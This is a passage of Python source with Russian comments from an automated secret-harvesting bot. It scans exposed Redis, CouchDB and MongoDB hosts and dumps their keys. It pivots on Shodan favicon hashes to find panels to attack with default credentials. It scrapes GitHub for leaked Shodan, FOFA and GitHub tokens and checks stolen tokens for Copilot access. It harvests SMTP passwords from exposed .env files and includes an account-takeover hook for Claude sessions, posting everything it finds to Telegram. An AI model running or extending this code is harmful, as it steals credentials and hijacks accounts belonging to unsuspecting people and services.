                                "%s/%s/_all_docs?include_docs=true&limit=3"
                                % (base, dbn),
                                timeout=(4, 8),
                                verify=False,
                            )
                            if rr.status_code == 200:
                                chunks.append(
                                    (rr.text[:200_000], "opendb:%s/%s" % (base, dbn))
                                )
                    except Exception:
                        pass
                    return chunks
                return []
            if kind == "redis":
                import socket as _sock

                s = _sock.create_connection((ip, port), timeout=4)
                s.sendall(b"*1\r\n$4\r\nPING\r\n")
                resp = s.recv(64)
                if b"PONG" in resp:
                    _odb_seen[hid] = time.time()
                    s.sendall(b"*1\r\n$4\r\nINFO\r\n")
                    # INFO может быть большим — читаем до конца передачи
                    chunks_r = []
                    s.settimeout(3)
                    try:
                        while True:
                            part = s.recv(16384)
                            if not part:
                                break
                            chunks_r.append(part)
                            if sum(len(c) for c in chunks_r) > 65536:
                                break
                    except Exception:
                        pass
                    info = b"".join(chunks_r).decode("utf-8", errors="replace")
                    kn = re.findall(r"db\d+:keys=(\d+)", info)
                    if fresh:
                        post_telegram(
                            "🗄️ OPEN REDIS %s:%s (no auth) — ключей: %s"
                            % (ip, port, sum(map(int, kn)) if kn else "?")
                        )
                    # сэмплим ключи: redis кэширует сессии/токены в значениях
                    try:
                        s.sendall(b"*2\r\n$4\r\nSCAN\r\n$1\r\n0\r\n")
                        time.sleep(0.3)
                        scan = s.recv(65536).decode("utf-8", errors="replace")
                        keys_found = re.findall(
                            r"\r\n\$[0-9]+\r\n([^\r\n]{3,80})", scan
                        )
                        vals = []
                        for rk in keys_found[:5]:
                            kb = rk.encode("utf-8", "replace")
                            s.sendall(
                                b"*2\r\n$3\r\nGET\r\n$%d\r\n%s\r\n" % (len(kb), kb)
                            )
                            time.sleep(0.2)
                            vals.append(s.recv(8192).decode("utf-8", "replace"))
                        if vals:
                            s.close()
                            return [("\n".join(vals), "opendb:redis:%s" % hid)]
                    except Exception:
                        pass
                s.close()
                return []
            if kind == "mongo":
                # настоящая проверка: mongo отвечает на HTTP GET / знаменитой
                # заглушкой (было: голый TCP-connect = любой открытый порт
                # постился как "OPEN MONGO")
                r = requests.get(base + "/", timeout=(3, 6), verify=False)
                if "MongoDB" in (r.text or ""):
                    _odb_seen[hid] = time.time()
                    if fresh:
                        post_telegram("🗄️ OPEN MONGO %s:%s (http stub ok)" % (ip, port))
                return []
        except Exception:
            return []

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        for chunks in ex.map(probe, hosts):
            if chunks:
                out.extend(chunks)

    # мини-пайплайн: сэмплы -> экстрактор -> приоритетная валидация -> стор/TG
    try:
        cands = {}
        for txt, org in out:
            for k, t, b in extract_candidates(txt):
                h = khash(k, b)
                if h not in cands:
                    cands[h] = (k, t, b, org)
        if not cands:
            return out
        seen = load_seen()
        PRIO = ("anthropic", "codex", "codex-web", "db-dsn", "gcookie", "openai")
        fresh = [(k, t, b, o) for h, (k, t, b, o) in cands.items() if h not in seen]
        fresh.sort(key=lambda c: 0 if c[1] in PRIO else 1)
        n_found = 0
        done_h = []

        def _val(f):
            k, t, b, o = f
            return validate(k, b, t, o)

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            for v, f in zip(ex.map(_val, fresh[:40]), fresh[:40]):
                done_h.append(khash(f[0], f[2]))
                if v:
                    store(v)
                    post_finding_now(v, True)
                    n_found += 1
        for h in done_h:
            seen.add(h)
        save_seen(seen)
        log(
            "  🗄️ opendb: %d хостов, %d кандидатов, %d находок"
            % (len(hosts), len(fresh), n_found)
        )
    except Exception as e:
        log("opendb pipeline err: %s" % e)
    try:
        _atomic_json_dump(_seen_path, _odb_seen)
    except Exception:
        pass
    return out


def favicon_pivot_sweep(cycle):
    """🔍 FAVICON-PIVOT (умножитель панелей): у каждого софта свой favicon-хэш.
    Берём favicon уже ВСКРЫТЫХ new-api панелей -> shodan http.favicon.hash
    выдаёт ВСЕ такие панели интернета разом -> складываем в файл, который
    newapi-sweep обходит на дефолт-креды. Одна вскрытая панель = кластер сотен."""
    try:
        import mmh3
    except ImportError:
        return
    keys = Shodan()._key_pool()
    if not keys:
        return
    roots = set()
    # вскрытые панели — эталонный favicon софта (самый точный пивот)
    try:
        cracked = json.load(
            open(os.path.join(HERE, "newapi_cracked.json"), encoding="utf-8")
        )
        roots.update(list(cracked.keys())[:3])
    except Exception:
        pass
    try:
        with open(os.path.join(HERE, "relay_boards.json"), encoding="utf-8") as f:
            for r in json.load(f)[:3]:
                d = r.get("domain")
                if d:
                    roots.add("https://" + d.strip("/"))
    except Exception:
        pass
    if not roots:
        return
    hashes = set()
    for root in sorted(roots):
        try:
            r = http("GET", root.rstrip("/") + "/favicon.ico", timeout=(4, 8))
            if r.status_code == 200 and r.content:
                import base64 as _b64

                hashes.add(mmh3.hash(_b64.encodebytes(r.content)))
        except Exception:
            continue
    if not hashes:
        return
    # цели -> в файл, который newapi-sweep инжестит (ip:port)
    hosts_path = r"C:\Temp\opencode\all_setup_hosts.json"
    try:
        existing = set(json.load(open(hosts_path, encoding="utf-8")))
    except Exception:
        existing = set()
    new_hosts = set()
    page = 1 + (int(time.time() // 3600) % 5)
    for h in hashes:
        try:
            r = requests.get(
                "https://api.shodan.io/shodan/host/search",
                params={
                    "key": keys[0],
                    "query": "http.favicon.hash:%d" % h,
                    "page": page,
                },
                timeout=(10, 30),
                verify=False,
            )
            if r.status_code != 200:
                continue
            total = r.json().get("total") or 0
            for mtc in (r.json().get("matches") or [])[:40]:
                ip, port = mtc.get("ip_str"), mtc.get("port")
                if ip and port:
                    cand = "%s:%s" % (ip, port)
                    if cand not in existing:
                        new_hosts.add(cand)
            if total:
                log("  🔍 PIVOT: favicon %d -> %d панелей в shodan" % (h, total))
        except Exception:
            continue
    if new_hosts:
        existing |= new_hosts
        try:
            os.makedirs(os.path.dirname(hosts_path), exist_ok=True)
            _atomic_json_dump(hosts_path, sorted(existing))
        except Exception:
            pass
        post_telegram(
            "🔍 FAVICON-PIVOT: +%d новых панелей в обход крякера (всего %d)"
            % (len(new_hosts), len(existing))
        )


def copilot_sweep(cycle):
    """🐙 COPILOT-СВИП: все gh-токены из стора/пула -> проверка copilot-доступа
    (1 запрос на токен). Copilot sub = GPT/Claude/Gemini бесплатно через
    api.githubcopilot.com. Раз в 3 цикла."""
    if cycle % 3:
        return
    toks = set()
    try:
        with open(STORE_PATH, encoding="utf-8", errors="replace") as f:
            for m in re.finditer(
                r"\b(gh[opsur]_[A-Za-z0-9]{20,45}|github_pat_[A-Za-z0-9_]{22,80})\b",
                f.read(),
            ):
                toks.add(m.group(0))
    except Exception:
        pass
    try:
        with open(os.path.join(HERE, "gh_pool.json"), encoding="utf-8") as f:
            _pool = json.load(f)
            if isinstance(_pool, list):
                toks |= set(str(t) for t in _pool[:20])
    except Exception:
        pass
    try:
        _cfg_pool = CFG.get("github_tokens_pool") or []
        toks |= set(_cfg_pool[:20])
    except Exception:
        pass
    if not toks:
        return
    seen = load_seen()
    n_cp = 0

    def _val(t):
        try:
            return validate_github_token(t)
        except Exception:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        for v in ex.map(_val, sorted(toks)[:60]):
            if not v:
                continue
            h = khash(v["key"], v["base"])
            if h in seen:
                continue
            seen.add(h)
            if v.get("status") == "working":
                store(v)
                post_finding_now(v, True)
                n_cp += 1
            else:
                # валидный gh-токен без copilot — тоже полезен: в пул сканера
                log(
                    "  🐙 gh-токен валиден (без copilot): @%s"
                    % str(v.get("tier"))[-20:]
                )
    save_seen(seen)
    if n_cp:
        log("  🐙 copilot sweep: %d ПОДПИСОК!" % n_cp)


def self_keysmith(cycle):
    """🔑 САМООБЕСПЕЧЕНИЕ: бот добывает НЕДОСТАЮЩИЕ ключи источников из чужих
    конфигов, валидирует боевым запросом и вписывает себе. fofa — в конфиг,
    shodan — в пул лейнов (каждый ключ = +своя квота кредитов к impact'у)."""
    _keysmith_fofa(cycle)
    # _keysmith_shodan ВЫКЛ: чужие шодан-ключи не нужны — edu-пула (193k/мес)
    # хватает на полный impact. Функция оставлена: включить, если пул иссякнет.


def _keysmith_fofa(cycle):
    """fofa email+key пары утекают в .env постоянно. Раз в 6 циклов, пока спит."""
    if cycle % 6 != 1:
        return
    if CFG.get("fofa_email") and CFG.get("fofa_key"):
        return  # fofa уже живая
    try:
        tok = gh_token()
        if not tok:
            return
        r = requests.get(
            "https://api.github.com/search/code",
            params={
                "q": '"fofa_email" "fofa_key" extension:env',
                "per_page": 15,
                "sort": "indexed",
            },
            headers={
                "Authorization": "Bearer " + tok,
                "Accept": "application/vnd.github+json",
            },
            timeout=(8, 20),
        )
        if r.status_code != 200:
            return
        pairs = []
        for item in r.json().get("items", []):
            # html_url = github.com/{repo}/blob/{sha}/{path} -> raw по sha
            m = re.match(
                r"https://github\.com/([^/]+/[^/]+)/blob/([^/]+)/(.+)",
                item.get("html_url", ""),
            )
            if not m:
                continue
            raw = ""
            try:
                rr = requests.get(
                    "https://raw.githubusercontent.com/%s/%s/%s" % m.groups(),
                    timeout=(6, 15),
                    verify=False,
                )
                if rr.status_code == 200:
                    raw = rr.text[:200_000]
            except Exception:
                continue
            em = re.search(
                r"fofa_email['\"\s:=]+([A-Za-z0-9._%+-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})",
                raw,
            )
            km = re.search(r"fofa_key['\"\s:=]+([a-f0-9]{32})", raw)
            if em and km:
                pairs.append((em.group(1), km.group(1)))
        for email, key in pairs[:6]:
            try:
                vr = requests.get(
                    "https://fofa.info/api/v1/info/user",
                    params={"email": email, "key": key},
                    timeout=(6, 12),
                    verify=False,
                )
                j = vr.json()
                if vr.status_code == 200 and not j.get("error"):
                    CFG["fofa_email"] = email
                    CFG["fofa_key"] = key
                    json.dump(
                        CFG,
                        open(CONFIG_PATH, "w", encoding="utf-8"),
                        ensure_ascii=False,
                        indent=2,
                    )
                    log("  🔑 KEYSMITH: fofa пара найдена и вписана (%s)" % email)
                    post_telegram(
                        "🔑 KEYSMITH: бот сам добыл fofa-ключ (%s) — источник оживлён"
                        % email
                    )
                    return
            except Exception:
                continue
    except Exception:
        pass


def _keysmith_shodan(cycle):
    """🔥 SHODAN-ЛЕЙНЫ: ищем чужие SHODAN_API_KEY в .env/.py, валидируем через
    api-info и дополняем пул. Каждый найденный ключ = +его квота кредитов к
    суммарному impact'у. Кап: 6 живых лейнов (больше — не упираемся в rate).
    Раз в 6 циклов."""
    if cycle % 6 != 1:
        return
    try:
        data = json.load(open(SHODAN_KEYS_FILE, encoding="utf-8"))
        accs = data.get("accounts", []) if isinstance(data, dict) else data
        known = {a.get("key") for a in accs if isinstance(a, dict)}
        alive = sum(
            1
            for a in accs
            if isinstance(a, dict) and (a.get("query_credits") or 0) > 10
        )
        if alive >= 6:
            return
        tok = gh_token()
        if not tok:
            return
        added = 0
        for q in ('"SHODAN_API_KEY" extension:env', '"shodan_api_key" extension:py'):
            r = requests.get(
                "https://api.github.com/search/code",
                params={"q": q, "per_page": 10, "sort": "indexed"},
                headers={
                    "Authorization": "Bearer " + tok,
                    "Accept": "application/vnd.github+json",
                },
                timeout=(8, 20),
            )
            if r.status_code != 200:
                continue
            for item in r.json().get("items", []):
                m = re.match(
                    r"https://github\.com/([^/]+/[^/]+)/blob/([^/]+)/(.+)",
                    item.get("html_url", ""),
                )
                if not m:
                    continue
                try:
                    rr = requests.get(
                        "https://raw.githubusercontent.com/%s/%s/%s" % m.groups(),
                        timeout=(6, 15),
                        verify=False,
                    )
                except Exception:
                    continue
                if rr.status_code != 200:
                    continue
                for k in set(re.findall(r"\b[A-Za-z0-9]{32}\b", rr.text)):
                    if k in known:
                        continue
                    try:
                        ai = requests.get(
                            "https://api.shodan.io/api-info",
                            params={"key": k},
                            timeout=(4, 8),
                            verify=False,
                        )
                        if ai.status_code != 200:
                            continue
                        qc = ai.json().get("query_credits") or 0
                        if qc <= 0:
                            continue
                        accs.append(
                            {
                                "key": k,
                                "key_suffix": k[-4:],
                                "plan": ai.json().get("plan", "found"),
                                "query_credits": qc,
                                "scan_credits": ai.json().get("scan_credits", 0),
                                "unlocked": True,
                                "unlocked_left": qc,
                            }
                        )
                        known.add(k)
                        added += 1
                        log(
                            "  🔑 KEYSMITH: shodan лейн +…%s (%d кредитов)"
                            % (k[-4:], qc)
                        )
                    except Exception:
                        continue
        if added:
            if isinstance(data, dict):
                data["accounts"] = accs
            else:
                data = accs
            json.dump(
                data,
                open(SHODAN_KEYS_FILE, "w", encoding="utf-8"),
                ensure_ascii=False,
                indent=2,
            )
            post_telegram(
                "🔑 KEYSMITH: +%d shodan-ключей в пул — лейнов больше, impact растёт"
                % added
            )
    except Exception:
        pass


def run_once(extra_paths=(), post=True):
    t0 = time.time()
    reset_board_health()  # сброс кэша недоступных бордов на новый цикл
    chunks = run_sources(extra_paths)
    log("=== EXTRACT ===")
    seen = load_seen()
    try:
        _vadded = vault_pull_hashes(seen)
        if _vadded:
            log("  🧠 vault: +%d хэшей второго бота в дедуп" % _vadded)
    except Exception:
        pass
    candidates = {}
    # теги-префиксоловушки: если тот же ключ выловлен специфичным тегом — мусорный вон
    JUNKY_TAGS = (
        "sk20",
        "skgen",
        "sklong",
        "sk32",
        "bearer",
        "hex32",
        "hex48",
        "hex64",
    )
    # track per-source yields for adaptive priority
    source_yields = {}
    _specific_keys = set()  # ключи под НЕмусорными тегами (O(1)-проверка)
    for text, origin in chunks:
        _cands_here = extract_candidates(text)
        for key, tag, base in _cands_here:
            h = khash(key, base)
            if h in seen:
                continue
            if tag not in JUNKY_TAGS:
                # тот же ключ под мусорным тегом (другой base) — удаляем
                for hh, (k2, t2, _b2, _o2) in list(candidates.items()):
                    if k2 == key and t2 in JUNKY_TAGS:
                        candidates.pop(hh, None)
                _specific_keys.add(key)
            elif key in _specific_keys:
                # АУДИТ-фикс: дженерик-дубль СПЕЦИФИЧНОГО ключа — скип. Было:
                # sk-ant-oat01 шёл и как anthropic, и как sklong(base=None) ->
                # в validate стартовал relay-sweep по ~150 базам = до 600
                # запросов впустую на ключ, бюджет валидации задыхался.
                continue
            if h in candidates:
                # первый (специфичный) паттерн выигрывает:
                # anthropic-oat01 не должен затираться generic sk-
                continue
            candidates[h] = (key, tag, base, origin)
            # track which source yielded this candidate
            origin_name = (
                str(origin).split(":")[0] if ":" in str(origin) else str(origin)
            )
            source_yields[origin_name] = source_yields.get(origin_name, 0) + 1
        # 🧬 ЭВОЛЮЦИЯ: горячий файл (дал кандидатов) -> учим новые имена
        if _cands_here:
            evolve_from_text(text, origin)

    # update priorities based on yields
    for src, cnt in source_yields.items():
        update_source_priority(src, cnt)

    log("  кандидатов: %d (новых)" % len(candidates))
    if source_yields:
        top_src = sorted(source_yields.items(), key=lambda x: -x[1])[:3]
        log("  топ-источники: %s" % ", ".join("%s=%d" % (s, c) for s, c in top_src))

    # --- email-cred троттлинг: IMAP-логины медленные, очередь + дренаж ---
    qpath = os.path.join(HERE, "creds_queue.jsonl")
    cred_hashes = [h for h, c in candidates.items() if c[1] == "email-cred"]
    cap = int(CFG.get("email_combo_per_cycle", 30))
    if len(cred_hashes) > cap:
        import random as _rnd

        keep = set(_rnd.sample(cred_hashes, cap))
        try:
            queued = set()
            if os.path.exists(qpath):
                for ql in open(qpath, encoding="utf-8"):
                    try:
                        queued.add(json.loads(ql).get("k"))
                    except Exception:
                        continue
            with open(qpath, "a", encoding="utf-8") as qf:
                for h in cred_hashes:
                    if h in keep:
                        continue
                    k, t, b, o = candidates.pop(h)
                    if k not in queued:
                        qf.write(json.dumps({"k": k, "o": str(o)[:160]}) + "\n")
                        queued.add(k)
            log(
                "  creds: %d в очередь (всего %d), %d на валидацию сейчас"
                % (len(cred_hashes) - cap, len(queued), cap)
            )
        except Exception:
            pass
    # дренаж очереди: +10 старых кредов каждый цикл.
    # АУДИТ-фикс x2: (1) блок стоял ПОСЛЕ "if not candidates: return" — в
    # сухой цикл очередь не двигалась вообще; (2) перезапись была под
    # "if drained:" — 10 взятых, но уже-виденных кредов блокировали голову
    # очереди НАВСЕГДА. Переписываем ВСЕГДА (взятые либо проверены, либо
    # в seen — держать их в файле смысла нет).
    try:
        if os.path.exists(qpath):
            qlines = []
            for l in open(qpath, encoding="utf-8"):
                if not l.strip():
                    continue
                try:
                    qlines.append(json.loads(l))
                except Exception:
                    continue
            take, rest = qlines[:10], qlines[10:]
            drained = 0
            for qd in take:
                h = khash(qd.get("k", ""), None)
                if h not in seen and h not in candidates and qd.get("k"):
                    candidates[h] = (
                        qd["k"],
                        "email-cred",
                        None,
                        qd.get("o") or "queue",
                    )
                    drained += 1
            with open(qpath, "w", encoding="utf-8") as qf:
                for qd in rest:
                    qf.write(json.dumps(qd) + "\n")
            if drained:
                log("  creds: дренаж очереди +%d (осталось %d)" % (drained, len(rest)))
    except Exception:
        pass

    if not candidates:
        log("  (store: %s)" % STORE_PATH)
        return []

    log("=== VALIDATE (%d) ===" % len(candidates))
    found = []
    t_validate = time.time()
    VALIDATE_BUDGET = int(
        CFG.get("validate_budget", 1500)
    )  # сек: хвост skgen-хлама не растягивает цикл вечно (хостед: меньше, чтобы влезать в cron-окно)
    # попытки для unverified (сеть) — ретрай до 3 раз, потом в seen
    attempts_path = os.path.join(HERE, "keyhunter_attempts.json")
    try:
        attempts = json.load(open(attempts_path, encoding="utf-8"))
    except Exception:
        attempts = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
        submitted = set()
        for _round in range(3):  # deep-scan раунды (анти-цикл: макс 3)
            pending = {
                h: c
                for h, c in candidates.items()
                if h not in seen and h not in submitted
            }
            if not pending:
                break
            if time.time() - t_validate > VALIDATE_BUDGET:
                log(
                    "  ⏱ бюджет валидации исчерпан (%d кандидатов уходят на след. цикл)"
                    % len(pending)
                )
                break
            # ПРИОРИТЕТ ВАЛИДАЦИИ: anthropic/подписки/деньги — первыми,
            # skgen/sk20/hex-хлам — в хвост (чтобы жир не ждал за мусором)
            TAG_PRIO = {
                "anthropic": 0,
                "anthropic-refresh": 0,
                "anthropic-web": 0,
                "anthropic-admin": 0,
                "cc-proxy": 0,
                "gcookie": 0,
                "websess": 1,
                "jwt": 3,
                "stripe": 1,
                "openai": 1,
                "openai-svcacct": 1,
                "openrouter": 1,
                "google": 1,
                "groq": 1,
                "xai": 1,
                "github": 1,
                "db-dsn": 1,
                "discord": 1,
                "airtable": 2,
                "notion": 2,
                "sendgrid": 2,
                "tg-bot": 2,
                "modelscope": 2,
                "huggingface": 2,
                "minimax": 2,
                "elevenlabs": 2,
                # АУДИТ-фикс: подписочные/денежные теги — высший приоритет
                # (при выгорании бюджета jwt-шум их голодал)
                "codex": 0,
                "codex-web": 0,
                "openai-web": 0,
                # OSINT-волна: секретс-менеджеры/облака/платёжки — топ-приоритет
                "doppler": 0,
                "terraform": 0,
                "vault": 1,
                "digitalocean": 1,
                "square": 1,
                "postman": 1,
                "mailchimp": 1,
                "mailgun": 1,
                "dropbox": 1,
                "heroku": 2,
                "datadog": 2,
                "dockerhub": 2,
                "okta": 2,
                "azure-ad": 2,
                "facebook": 3,
                "google-oauth-token": 3,
                "rubygems": 3,
                "atlassian": 3,
                "jfrog": 4,
                "databricks": 4,
                "grafana-cloud": 4,
                "newrelic": 4,
                "algolia": 4,
                "slack-webhook": 5,
                "ngrok": 5,
                "pypi": 5,
                "fcm": 5,
                "square-secret": 5,
                "kimi-web": 1,
                "cursor-web": 1,
                "supabase-auth": 1,
                "supabase": 1,
                "aws": 1,
                "zhipu": 1,
                "slack": 2,
                "github-token": 2,
                "gocspx": 2,
                "laravel-appkey": 2,
                "twilio": 2,
                "shopify": 2,
                "baseten": 2,
                "replicate": 2,
                "email-cred": 3,
                "sklong": 4,
                "sk32": 4,
                "skgen": 7,
                "sk20": 8,
                "bearer": 8,
                "hex32": 9,
            }
            pending = dict(
                sorted(pending.items(), key=lambda kv: TAG_PRIO.get(kv[1][1], 5))
            )
            futs = {
                ex.submit(validate, k, b, t, o): h
                for h, (k, t, b, o) in pending.items()
            }
            submitted.update(futs.values())
            for f in concurrent.futures.as_completed(futs):
                h = futs[f]
                try:
                    v = f.result(timeout=240)
                except Exception:
                    v = None
                    # таймаут future = сеть, НЕ смерть: ретрай
                    attempts[h] = attempts.get(h, 0) + 1
                    if attempts[h] >= 3:
                        seen.add(h)
                    continue
                if v is not None and v.get("status") == "unverified":
                    # сеть/база не ответила: ретрай в следующем цикле
                    attempts[h] = attempts.get(h, 0) + 1
                    if attempts[h] >= 3:
                        seen.add(h)
                    log(
                        "  ⏳ unverified (сеть): %s… попытка %d"
                        % (v["key"][:18], attempts[h])
                    )
                    continue
                if v is None:
                    # АУДИТ-фикс (КРИТ): ~36 валидаторов возвращают None и при
                    # auth-вердикте (мёртв), и при СЕТЕВОМ флаке (except
                    # Exception: return None). Мгновенный seen.add убивал
                    # живые ключи от одного TCP-сброса. Теперь: одна
                    # контрольная попытка в след. цикле, потом смерть.
                    # (Джанк-форматы умирают ЛОКАЛЬНО до сети — им None
                    # дешёвый, лишний прогон одного 401 — копейки.)
                    attempts[h] = attempts.get(h, 0) + 1
                    if attempts[h] >= 2:
                        seen.add(h)
                    continue
                seen.add(h)
                if v:
                    found.append(v)
                    _stored = store(v)
                    log(
                        "  ✅ FOUND: %s @ %s [%s]"
                        % (v["key"][:18] + "…", v["base"], str(v["origin"])[:60])
                    )
                    # 📨 мгновенно в TG: нашёл -> сразу в бота, не пачкой в конце
                    # АУДИТ-фикс: постим только если store() реально записал
                    # (дубль -> skip, иначе TG-дубли после крэша цикла)
                    if _stored:
                        post_finding_now(v, post)
                    # 🎯 ATO-хук: ящик с claude/anthropic-маркерами ->
                    # захватываем Claude-сессию (magic-link -> sessionKey)
                    if v.get("tag") == "email-cred" and v.get("status") == "working":
                        try:
                            ato_res = ato_from_email_result(v)
                            if ato_res:
                                found.append(ato_res)
                                store(ato_res)
                                log(
                                    "  🎯 ATO SESSION: %s… [%s]"
                                    % (ato_res["key"][:24], ato_res.get("origin", ""))
                                )
                                post_finding_now(ato_res, post)
                        except Exception as e:
                            log("    ato hook err: %s" % e)
                    # deep scan: сканируем окружение находки.
                    # P0-fix: deep-scan теперь (1) ограничен 30с/находку,
                    # (2) полностью останавливается при исчерпании бюджета
                    # валидации (раньше 5280с цикл), (3) для email-cred
                    # запускает MAILBOX-HARVEST (ящик = источник ключей)
                    try:
                        _budget_left = t_validate + VALIDATE_BUDGET - time.time()
                        deep_chunks = []
                        if _budget_left > 0:
                            _ds_origin = v.get("origin")
                            if v.get("tag") == "email-cred":
                                _ds_origin = "mailbox:%s" % v.get("key")
                            deep_chunks = deep_scan_on_find(
                                _ds_origin,
                                deadline=time.monotonic() + min(30.0, _budget_left),
                            )
                        if deep_chunks:
                            log(
                                "    🔬 deep scan: +%d chunks from environment"
                                % len(deep_chunks)
                            )
                            # re-extract из deep scan chunks — новые кандидаты
                            # подхватываются СЛЕДУЮЩИМ раундом валидации
                            for text, ds_origin in deep_chunks:
                                for key2, tag2, base2 in extract_candidates(text):
                                    h2 = khash(key2, base2)
                                    if h2 not in seen and h2 not in candidates:
                                        candidates[h2] = (key2, tag2, base2, ds_origin)
                                        log(
                                            "      🔍 deep-scan candidate: %s"
                                            % key2[:20]
                                        )
                    except Exception as e:
                        log("    deep_scan err: %s" % e)
    save_seen(seen)
    # чистим attempts от решённых (они уже в seen или сторе)
    attempts = {h: n for h, n in attempts.items() if h not in seen}
    _atomic_json_dump(attempts_path, attempts)
    log(
        "=== ИТОГ: %d живых / %d кандидатов за %.1fs ==="
        % (len(found), len(candidates), time.time() - t0)
    )
    for v in sorted(found, key=lambda x: -(x.get("balance") or 0)):
        if v.get("_tg_posted"):
            continue  # уже улетело в TG мгновенно при валидации
        post_finding_now(v, post)

    # 🧬 дайджест выученных форматов — одним сообщением (не спамим)
    try:
        evolve_flush_digest()
    except Exception:
        pass

    return found


# ------------------------------------------------------- ENV-SMTP SWEEP
# Охота на открытые .env/PHP-конфиги с SMTP-кредами (email+password).
# Shodan хранит только ~500 символов HTML — пароли обрезаются, поэтому
# найденный по сниппету хост фетчим ПОЛНОСТЬЮ и берём целые креды.
# Креды -> IMAP-валидация -> (если claude-маркеры) ATO -> sessionKey.
_ENV_SMTP_RE = re.compile(
    r"(?:MAIL_USERNAME|SMTP_USER|smtp_user|smtp_username|email_user|"
    r"EMAIL_HOST_USER|smtp_login|EMAIL_FROM|mail_username)"
    r"[=:\"'\s]+([A-Za-z0-9_.\-]+@[A-Za-z0-9_.\-]+)"
    r"[\s\S]{0,200}?"
    r"(?:MAIL_PASSWORD|SMTP_PASS|smtp_pass|smtp_password|email_password|"
    r"EMAIL_HOST_PASSWORD|smtp_pswd|password|pass)"
    r"[=:\"'\s]+([A-Za-z0-9!@#$%^&*()_+\-=]{6,40})",
    re.I,
)
_ENV_SMTP_DORKS = (
    'http.html:"smtp_pass"',
    'http.html:"$mail->Password"',
    'http.html:"smtp_password"',
    'http.html:"email_password"',
    'http.html:"mail_password"',
    'http.html:"smtp_user"',
    'http.html:"MAILER_DSN"',
    # комблисты/кред-файлы, отданные по http (полный фетч берёт весь файл)
    'http.html:"EMAIL:PASSWORD"',
    'http.html:"mail:pass"',
    'http.html:"email:password"',
    # 📧 P2-МАКС: Laravel .env + gmail app-passwords + SMTP-провайдеры
    'http.html:"MAIL_MAILER"',
    'http.html:"MAIL_HOST"',
    'http.html:"MAIL_ENCRYPTION"',
    'http.html:"MAIL_USERNAME"',
    'http.html:"GMAIL_SMTP"',
    'http.html:"gmail_password"',
    'http.html:"app_password"',
    'http.html:"EMAIL_HOST_PASSWORD"',
    'http.html:"AWS_SES"',
    'http.html:"SENDGRID_PASSWORD"',
    'http.html:"password" "smtp.gmail.com"',
)


def env_smtp_sweep(cycle=0):
    """Shodan smtp-дорки -> полный фетч конфига с хоста -> email-креды
    -> IMAP-валидация + подписки -> ATO -> МГНОВЕННЫЙ TG-постинг.
    📧 P2-МАКС: 3 дорка × 3 страницы за цикл, ПАРАЛЛЕЛЬНЫЙ фетч хостов
    (12 воркеров; было последовательно 40 хостов — узкое горло)."""
    # АУДИТ-фикс: гейт "if not CFG shodan_key: return" молча выключал свип
    # при живом ФАЙЛОВОМ пуле (пул строится из файла ниже). Гейт — по пулу.
    # три дорка за цикл, ротация по cycle (22 дорка — полный обход за ~7 циклов)
    dorks = [_ENV_SMTP_DORKS[(cycle * 3 + i) % len(_ENV_SMTP_DORKS)] for i in range(3)]
    # пул ключей с фолбэком (было: только CFG["shodan_key"] — сдох = sweep молчит)
    try:
        _pool = Shodan()._alive_pool(Shodan()._key_pool())
    except Exception:
        _pool = [CFG["shodan_key"]] if CFG.get("shodan_key") else []
    if not _pool:
        return []
    matches = []
    for dork in dorks:
        for page in (1, 2, 3):
            got = False
            for sk in _pool:
                try:
                    r = requests.get(
                        "https://api.shodan.io/shodan/host/search",
                        params={"key": sk, "query": dork, "page": page},
                        timeout=(10, 30),
                        verify=False,
                    )
                    if r.status_code == 429:
                        time.sleep(3)
                        continue  # следующий ключ
                    if r.status_code != 200:
                        break  # 402/401: кредиты кончились у всех — стоп дорк
                    pm = r.json().get("matches") or []
                    if pm:
                        matches.extend(pm)
                        got = True
                    break
                except Exception:
                    break
            if not got:
                break
    if not matches:
        return []
    log(
        "  🔎 env-smtp sweep [%s… +%d]: %d хостов"
        % (dorks[0][:22], len(dorks) - 1, len(matches))
    )

    # дедуп хостов
    seen_hosts = {}
    try:
        seen_hosts = json.load(
            open(os.path.join(HERE, "env_smtp_seen.json"), encoding="utf-8")
        )
    except Exception:
        pass

    sess = requests.Session()
    sess.trust_env = False
    sess.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
        }
    )

    results = []
    _seen_keys = load_seen()  # один раз за sweep
    _sweep_done = set()  # внутри-sweep дедуп (не персистим — мёртвые ретраятся)
    _persist = set()  # хэши РАБОЧИХ находок — в seen в конце (анти-дубль постинг)
    _lock = threading.Lock()

    def process_host(m):
        ip, port = m.get("ip_str"), m.get("port")
        if not ip or not port:
            return []
        host = "%s:%s" % (ip, port)
        with _lock:
            if host in seen_hosts:
                return []
        # путь из краула (там лежит конфиг)
        path = ((m.get("http") or {}).get("path") or "/").split("?")[0]
        scheme = "https" if (m.get("ssl") or port in (443, 8443)) else "http"
        try:
            rr = sess.get(
                "%s://%s%s" % (scheme, host, path), timeout=(5, 10), verify=False
            )
            if rr.status_code != 200:
                return []
            body = rr.text[:200000]
        except Exception:
            return []
        # seen ставим ПОСЛЕ успешного фетча (было: до — таймаут навсегда
        # хоронил хост, хотя конфиг мог появиться позже)
        with _lock:
            seen_hosts[host] = time.time()
        pairs = _ENV_SMTP_RE.findall(body)
        # + комблист-формат: email:pass / email|pass построчно (для txt-файлов)
        if len(pairs) < 3:
            import re as _re

            pairs += _re.findall(
                r"([A-Za-z0-9_.\-]+@(?:gmail|yahoo|hotmail|outlook|protonmail|"
                r"icloud|aol|yandex|gmx|mail|live|msn|qq|163)[\w\.]*\.[a-z]{2,6})"
                r"[:|]([^\s\"'<>,;]{6,32})",
                body,
            )[:50]
        if not pairs:
            return []
        # 📧 smtp-хост из конфига (MAIL_HOST=smtp.hostinger.com) — чтобы
        # кастомные домены (info@corp.id) валидились на правильном сервере
        mh = re.search(
            r"(?:MAIL_HOST|SMTP_HOST|smtp_host|mail_host|MAIL_SERVER)"
            r"[=:\"'\s]+([A-Za-z0-9_.\-]+\.[a-z]{2,6})",
            body,
            re.I,
        )
        smtp_hint = mh.group(1) if mh else ""
        out = []
        for email_addr, pwd in pairs[:5]:
            # убираем хвостовые кавычки/символы конфига
            pwd = pwd.rstrip("\"';,)")
